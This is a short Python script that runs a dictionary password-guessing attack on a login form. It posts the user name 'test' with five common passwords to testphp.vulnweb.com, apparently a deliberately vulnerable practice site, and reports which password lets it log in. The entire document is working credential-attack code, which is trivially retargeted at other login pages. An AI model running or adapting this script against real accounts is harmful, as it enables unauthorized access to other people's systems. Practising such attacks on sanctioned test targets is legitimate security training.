import requests

# Try different password combinations
passwords_to_try = ["test", "password", "123456", "admin", "secret"]

for password in passwords_to_try:
    login_data = {
        'uname': 'test',
        'pass': password
    }
    
    response = requests.post("http://testphp.vulnweb.com/login.php", data=login_data)
    
    if "Logout" in response.text:
        print(f"✅ Success! Password found: {password}")
        break
    else:
        print(f"❌ Wrong password: {password}")
